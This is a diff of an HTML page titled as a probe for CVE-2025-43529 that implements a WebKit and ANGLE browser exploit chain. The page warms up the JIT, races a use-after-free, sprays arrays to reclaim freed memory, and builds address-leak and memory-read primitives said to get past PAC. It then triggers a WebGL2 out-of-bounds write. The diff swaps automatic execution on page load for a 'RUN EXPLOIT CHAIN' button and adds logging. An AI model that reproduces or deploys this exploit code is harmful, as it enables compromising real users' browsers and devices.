@@ -1,14 +1,27 @@
 <!DOCTYPE html>
 <html>
-<body style="background:#000;color:#0f0;font-family:monospace;">
-<pre id="log">Status: Waiting for initialization...</pre>
-<canvas id="glCanvas" style="display:none"></canvas>
+<head>
+    <title>CVE-2025-43529 Exploit Probe</title>
+</head>
+<body style="background:#000; color:#0f0; font-family:monospace; padding:20px;">
+    <h1>WebKit + ANGLE Exploit Chain</h1>
+    <p>Status: Ready. HTML loaded. Press the button to start the race.</p>
+    
+    <button id="startBtn" style="padding:15px 30px; background:#0f0; color:#000; font-weight:bold; cursor:pointer; border:none; border-radius:5px;">
+        RUN EXPLOIT CHAIN
+    </button>
+
+    <hr style="border:0.5px solid #333; margin:20px 0;">
+    <pre id="log">Console initialized...</pre>
+    <canvas id="glCanvas" style="display:none"></canvas>
+
 <script>
 const log = m => {
     document.getElementById('log').textContent += `\n[+] ${m}`;
     console.log(m);
 };
 
+// --- الأدوات الأساسية (Utilities) ---
 const buf = new ArrayBuffer(8), u64 = new BigUint64Array(buf), f64 = new Float64Array(buf);
 const itof = v => { u64[0] = v; return f64[0]; };
 const ftoi = f => { f64[0] = f; return u64[0]; };
@@ -25,20 +38,26 @@ function trigger(flag, k) {
     b.p1 = a; 
 }
 
-// دالة التنفيذ غير المتزامن لمنع تعليق الموقع
-async function start() {
-    log("Warming up JIT...");
+// --- المنطق الأساسي للتنفيذ (Core Execution) ---
+async function startExploit() {
+    const btn = document.getElementById('startBtn');
+    btn.disabled = true; // منع الضغط المتعدد
+    btn.style.background = "#555";
+    btn.textContent = "EXECUTING...";
+
+    log("Step 1: JIT Warmup starting...");
+    // إحماء الـ JIT
     for(let i=0; i<1500; i++) trigger(false, 0); 
     
-    log("Starting Race - Async Mode Enabled");
+    log("Step 2: Starting Race Window (Async Mode)...");
     let success = false;
     let spray = [];
 
     for (let k = 0; k < 20000; k++) {
-        // نمنح المتصفح 1ms كل 100 محاولة لتحديث الصفحة ومنع التعليق
-        if (k % 100 === 0) {
+        // نمنح المتصفح فرصة لتحديث الـ UI كل 200 محاولة
+        if (k % 200 === 0) {
             await new Promise(r => setTimeout(r, 1));
-            log(`Attempt ${k}...`);
+            log(`Progress: Attempt ${k}...`);
         }
 
         trigger(false, 120); 
@@ -49,34 +68,47 @@ async function start() {
             let s = [13.37, 1.1, 2.2, 3.3, 4.4, {id: i}];
             spray.push(s);
             if (freed[0] === 13.37) {
-                log(`WINNER! Reclaimed at ${k}`);
+                log(`!!! SUCCESS: Butterfly Reclaimed at iteration ${k} !!!`);
                 setup(s, freed); success = true; break;
             }
         }
         if (success) break;
     }
+    
+    if (!success) {
+        log("Race timed out. Try increasing attempts or K value.");
+        btn.disabled = false;
+        btn.style.background = "#0f0";
+        btn.textContent = "RETRY EXPLOIT";
+    }
 }
 
 function setup(winningArr, freed) {
-    winningArr[0] = {}; 
+    winningArr[0] = {}; // تحويل المصفوفة لـ Contiguous
     const leak = o => { winningArr[0] = o; return ftoi(freed[0]); };
+    
+    // بناء Read64 عبر الـ Inline Storage لتجاوز الـ PAC
     const read64 = addr => {
         freed[0] = itof(addr - 0x10n); 
         return ftoi(winningArr[0].p0);
     };
-    log(`Target Leaked: 0x${leak(target).toString(16)}`);
+
+    const targetAddr = leak(target);
+    log(`[PRIMITIVE] Target Leaked at: 0x${targetAddr.toString(16)}`);
     
+    // Stage 3: ANGLE
     const gl = document.getElementById('glCanvas').getContext('webgl2');
     if (gl) {
+        log("Triggering ANGLE OOB...");
         gl.pixelStorei(0x8062, 16); 
         const tex = gl.createTexture(); gl.bindTexture(0xDE1, tex);
         gl.texImage2D(0xDE1, 0, 0x822E, 256, 256, 0, 0x1902, 0x1406, 0);
-        log(gl.isContextLost() ? "GPU Pwned" : "OOB OK");
+        log(gl.isContextLost() ? "RESULT: GPU Process Context Lost" : "RESULT: OOB Triggered Silently");
     }
 }
 
-// بدء التشغيل بعد تحميل الصفحة تماماً
-window.onload = start;
+// ربط الزر بالدالة
+document.getElementById('startBtn').addEventListener('click', startExploit);
 </script>
 </body>
 </html>
